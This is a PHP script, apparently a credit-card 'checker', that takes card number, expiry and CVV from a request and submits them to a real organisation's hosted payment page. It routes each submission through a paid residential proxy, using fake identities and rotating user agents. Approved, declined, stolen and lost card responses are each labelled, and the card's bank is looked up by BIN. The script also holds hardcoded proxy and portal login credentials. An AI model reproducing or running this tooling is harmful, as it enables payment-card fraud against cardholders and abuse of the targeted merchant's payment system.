<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 

function getStr($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}



extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc  = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];


$name01   = file('navegador333.txt', FILE_IGNORE_NEW_LINES);
$rand01   = rand(0, count($name01)-1);
$nome01 = $name01[$rand01];
$formata_dados01 = explode("|", $nome01);
$userAgent  = $formata_dados01[0];	

//ID DA SESSÃO
$name1 = file('session_id.txt', FILE_IGNORE_NEW_LINES);
$rand1 = rand(0, count($name1)-1);
$nome1 = $name1[$rand1];
$formata_dados1 = explode("|", $nome1);
$TransactionSetupID  = $formata_dados1[0];



/*
$CardType = substr($cc, 0, 1);
if($CardType=="6"){ $CardType="NN"; //DISCOVER 
}else if($CardType=="4"){ $CardType="VI";  //VISA
}else if($CardType=="5"){ $CardType="MC"; //MASTER 
}else if($CardType=="2"){ $CardType="MC"; //MASTER 
}else if($CardType=="3"){ $CardType="AM"; // AMEX
  }
*/


  $username = 'bobgilberto'; 
  $password = '78aJc0dP6nLm47MG'; 
  $proxy = 'proxy.packetstream.io:31112';

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Accept: application/json',
  'Content-Type: application/json',
  ));
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $proxyip = curl_exec($ch);
  

  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIE, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $resposta = curl_exec($ch);
    $firstname = getStr($resposta, '"first":"', '"');
    $lastname = getStr($resposta, '"last":"', '"');
    $phone = getStr($resposta, 'phone":"', '"');
    $zip = getStr($resposta, '"postcode":', ',"');  
    $state = getStr($resposta, 'state":"', '"');
    $state_full = getStr($resposta, 'state":"', '"');
    $email = getStr($resposta, 'email":"', '"');
    $city = getStr($resposta, 'city":"', '"');
    $street = getStr($resposta, '"name":"', '"}');
    $number = getStr($resposta, '"number":', ',"');
    $numero1 = substr($phone, 1, 3);
    $numero2 = substr($phone, 6, 3);
    $numero3 = substr($phone, 10, 4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","homtail.com","yahoo.com","ymail.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email= str_replace("example.com", $serv_rnd, $email);
    if($state=="Alabama"){ $state="AL";
  }else if($state=="Alaska"){ $state="AK";
  }else if($state=="Arizona"){ $state="AR";
  }else if($state=="California"){ $state="CA";
  }else if($state=="Olorado"){ $state="CO";
  }else if($state=="Connecticut"){ $state="CT";
  }else if($state=="Delaware"){ $state="DE";
  }else if($state=="District of columbia"){ $state="DC";
  }else if($state=="Florida"){ $state="FL";
  }else if($state=="Georgia"){ $state="GA";
  }else if($state=="Hawaii"){ $state="HI";
  }else if($state=="Idaho"){ $state="ID";
  }else if($state=="Illinois"){ $state="IL";
  }else if($state=="Indiana"){ $state="IN";
  }else if($state=="Iowa"){ $state="IA";
  }else if($state=="Kansas"){ $state="KS";
  }else if($state=="Kentucky"){ $state="KY";
  }else if($state=="Louisiana"){ $state="LA";
  }else if($state=="Maine"){ $state="ME";
  }else if($state=="Maryland"){ $state="MD";
  }else if($state=="Massachusetts"){ $state="MA";
  }else if($state=="Michigan"){ $state="MI";
  }else if($state=="Minnesota"){ $state="MN";
  }else if($state=="Mississippi"){ $state="MS";
  }else if($state=="Missouri"){ $state="MO";
  }else if($state=="Montana"){ $state="MT";
  }else if($state=="Nebraska"){ $state="NE";
  }else if($state=="Nevada"){ $state="NV";
  }else if($state=="New Hampshire"){ $state="NH";
  }else if($state=="New Jersey"){ $state="NJ";
  }else if($state=="New Mexico"){ $state="NM";
  }else if($state=="New York"){ $state="LA";
  }else if($state=="North Carolina"){ $state="NC";
  }else if($state=="North Dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="Oklahoma"){ $state="OK";
  }else if($state=="Oregon"){ $state="OR";
  }else if($state=="Pennsylvania"){ $state="PA";
  }else if($state=="Rhode Island"){ $state="RI";
  }else if($state=="South Carolina"){ $state="SC";
  }else if($state=="South Dakota"){ $state="SD";
  }else if($state=="Tennessee"){ $state="TN";
  }else if($state=="Texas"){ $state="TX";
  }else if($state=="Utah"){ $state="UT";
  }else if($state=="Vermont"){ $state="VT";
  }else if($state=="Virginia"){ $state="VA";
  }else if($state=="Washington"){ $state="WA";
  }else if($state=="West Virginia"){ $state="WV";
  }else if($state=="Wisconsin"){ $state="WI";
  }else if($state=="Wyoming"){ $state="WY";
  }else if($state=="Colorado"){ $state="CO";
  
  
  }else if($state=="Alberta"){ $state="AB"; 
  }else if($state=="British Columbia"){ $state="BC"; 
  }else if($state=="Manitoba"){ $state="MB"; 
  }else if($state=="New Brunswick"){ $state="NB"; 
  }else if($state=="Newfoundland and Labrador"){ $state="NL"; 
  }else if($state=="Northwest Territories"){ $state="NT"; 
  }else if($state=="Nova Scotia"){ $state="NS"; 
  }else if($state=="Nunavut"){ $state="NU"; 
  }else if($state=="Ontario"){ $state="ON"; 
  }else if($state=="Prince Edward Island"){ $state="WY"; 
  }else if($state=="Québec"){ $state="QC"; 
  }else if($state=="Saskatchewan"){ $state="SK"; 
  }else if($state=="Yukon"){ $state="YT"; 
  }
  

  $md=rand(15,30);
  $cd=rand(00,99);
  
  $random = rand(1000, 10000000000); // ISSO AQUI ษ UM RANDOM QUE EU FIZ APENAS PRA ELE GERAR O COOKIE SEM O MESMO NOME (PRA NAO DAR CONFLITO)

  

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://transaction.hostedpayments.com/?TransactionSetupID='.$TransactionSetupID.''); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: transaction.hostedpayments.com',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://bgctopekamch.my.site.com/',
'Accept-Language: pt-BR,pt;q=0.9',
	));
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d7 = curl_exec($ch);


$html = $d7; 
$document = new DOMDocument();
$document->loadHTML($html);

$inputs = $document->getElementsByTagName("input"); 

foreach ($inputs as $input) {
  if ($input->getAttribute("name") == "__VIEWSTATE") {   
    $__VIEWSTATE = $input->getAttribute("value");   
  }
  
  if ($input->getAttribute("name") == "__VIEWSTATEGENERATOR") {   
    $__VIEWSTATEGENERATOR = $input->getAttribute("value"); 
  }
  
    if ($input->getAttribute("name") == "__EVENTVALIDATION") {   
    $__EVENTVALIDATION = $input->getAttribute("value"); 
  }   
}




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://transaction.hostedpayments.com/?TransactionSetupID='.$TransactionSetupID.'');
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
'Host: transaction.hostedpayments.com',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cache-Control: no-cache',
'Accept: */*',
'Origin: https://transaction.hostedpayments.com',
'Referer: https://transaction.hostedpayments.com/?TransactionSetupID='.$TransactionSetupID.'',
'Accept-Language: pt-BR,pt;q=0.9',
	));
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE='.trim(urlencode($__VIEWSTATE)).'&__VIEWSTATEGENERATOR='.$__VIEWSTATEGENERATOR.'&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION='.trim(urlencode($__EVENTVALIDATION)).'&hdnCancelled=&cardNumber='.$cc.'&ddlExpirationMonth='.$mes.'&ddlExpirationYear='.$ano.'&CVV=%20%20%20&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&hdnEncoded=&__ASYNCPOST=true&');
$d8 = curl_exec($ch);

$msg = getStr($d8, '<table class="tableErrorMessage error" role="presentation"><tr><td class="tableTdErrorMessage"><span class="error">-&nbsp;<b>Error</b>: ', '</span><br /></td></tr></table>');




$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin; 
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $bandeira = $pieces[1];
    $banco = $pieces[2];
    $tipo = $pieces[3];
    $level = $pieces[4];
    $pais = $pieces[5];
    
 
} else {
    $bandeira = $pieces[1];
    $banco = $pieces[2];
    $type = $pieces[3];
    $level = $pieces[4];
    $pais = $pieces[5];
 }

   


 if (strpos($d8,'ExpressResponseCode=0&ExpressResponseMessage=Approved') == true|| strpos($d8,'&ExpressResponseMessage=Approved&CVVResponseCode=N') == true) {

  $CSRFToken = csrf_token(); // _token
  $encrypter = app('Illuminate\Encryption\Encrypter');      
  $encrypted_token = $encrypter->encrypt(csrf_token());   //XSRF-TOKEN encrypted
   
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, 'http://localhost/admin/withdraw');
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
   curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
     'Host: localhost',
     'Connection: keep-alive',
     'Cache-Control: max-age=0',
     'Origin: http://localhost',
     'Content-Type: application/x-www-form-urlencoded',
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'Referer: http://localhost/admin/deposit',
     'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
     'Cookie: XSRF-TOKEN='.trim(urlencode($encrypted_token)).'; laravel_session='.$_COOKIE['laravel_session'].'',
     ));
   curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
   curl_setopt($ch, CURLOPT_HEADER, 1);
   curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
   curl_setopt($ch, CURLOPT_POST, 1);
   curl_setopt($ch, CURLOPT_POSTFIELDS, '_token='.$CSRFToken.'&value=0.5');
   $saldo = curl_exec($ch); 
 
   if(stristr($saldo,'Sucesso ao Retirar') !== false){   //Opa Retirei R$ sua conta
   
    echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') Retorno: Descontou (R$ - 0,5) <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
		
	 }
  }



  // Returns Bad

   elseif(strpos($d8,'Declined')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }



   elseif(strpos($d8,'INVALID CARD INFO')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }



   elseif(strpos($d8,'Expired Card')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }



   elseif(strpos($d8,'STOLEN CARD')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }



   elseif(strpos($d8,'Not Authorized')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }


   

   elseif(strpos($d8,'LOST CARD')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }



   elseif(strpos($d8,'CVV2 VALUE MISMATCH')) {

    echo '       
    <div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                      <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                      <div class="alert__icon pull-left" >
                                        <i class="pe-7s-close-circle"></i>
                                      </div>
                                      <div class="text-center">
                                      <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -  Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                      </div>
     
                             
      </div>
                                    </div>
    ';
    
   }





else{
      


  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/s/billing');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'Upgrade-Insecure-Requests: 1',
  'User-Agent: '.$userAgent.'',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $d1 = curl_exec($ch);
  
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/s/sfsites/aura?r=2&applauncher.LoginForm.login=1'); 
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'X-SFDC-Page-Scope-Id: bf783da3-685c-46cc-a9fb-ca996fea6f9c',
  'User-Agent: '.$userAgent.'',
  'Accept: */*',
  'Origin: https://bgctopekamch.my.site.com',
  'Referer: https://bgctopekamch.my.site.com/portal/s/login/?ec=302&startURL=%2Fportal%2Fs%2Fbilling',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2285%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2Fapplauncher.LoginFormController%2FACTION%24login%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2FsalesforceIdentity%3AloginForm2%22%2C%22params%22%3A%7B%22username%22%3A%22edd6399899b7%40drmail.in%22%2C%22password%22%3A%22Ma10203040-%22%2C%22startUrl%22%3A%22%2Fportal%2Fs%2Fbilling%22%7D%2C%22version%22%3A%2257.0%22%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22D7zdsGvlxZfFP0e3F1H_2A%22%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22drm8uDQLtJbJQ2UQkZa9OQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fportal%2Fs%2Flogin%2F%3Fec%3D302%26startURL%3D%252Fportal%252Fs%252Fbilling&aura.token=null');
  $d2 = curl_exec($ch);
  
  $sid = getStr($d2, '&sid=', '&'); 
  $cshc = getStr($d2, '&cshc=', '&'); 
  
  
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/secur/frontdoor.jsp?allp=1&apv=1&cshc='.$cshc.'&refURL=https%3A%2F%2Fbgctopekamch.my.site.com%2Fportal%2Fsecur%2Ffrontdoor.jsp&retURL=%2Fportal%2Fs%2Fbilling&sid='.$sid.'&untethered=');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'Upgrade-Insecure-Requests: 1',
  'User-Agent: '.$userAgent.'',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Referer: https://bgctopekamch.my.site.com/portal/s/login/?ec=302&startURL=%2Fportal%2Fs%2Fbilling',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $d3 = curl_exec($ch);
  
  
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/s/billing');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'Upgrade-Insecure-Requests: 1',
  'User-Agent: '.$userAgent.'',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Referer: https://bgctopekamch.my.site.com/portal/secur/frontdoor.jsp?allp=1&apv=1&cshc=x000008CWqJx0000026DN5&refURL=https%3A%2F%2Fbgctopekamch.my.site.com%2Fportal%2Fsecur%2Ffrontdoor.jsp&retURL=%2Fportal%2Fs%2Fbilling&sid=00D4x0000026DN5%21ARcAQNDAPpbYQrp5.j0lsXSlLbbxIpXvuDd0LpOUG1qMkUDYDvHiEQGML2swVRhBeANN4pge8WrEvVFguFSQ9MC0VXFzc7AG&untethered=',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $d4 = curl_exec($ch);
  $token = getStr($d4, '"token":"', '"'); 
  
  
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/s/sfsites/aura?r=11&ui-identity-components-sessiontimeoutwarn.SessionTimeoutWarn.getSessionTimeoutConfig=1');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'X-SFDC-Page-Scope-Id: ec870184-f3df-49ad-a761-88c26d42dc31',
  'X-SFDC-Request-Id: 5683790000dbe8d64e',
  'User-Agent: '.$userAgent.'',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'X-SFDC-Page-Cache: aa3a4a6b5ef9e956',
  'Accept: */*',
  'Origin: https://bgctopekamch.my.site.com',
  'Referer: https://bgctopekamch.my.site.com/portal/s/billing',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_POST, 1);
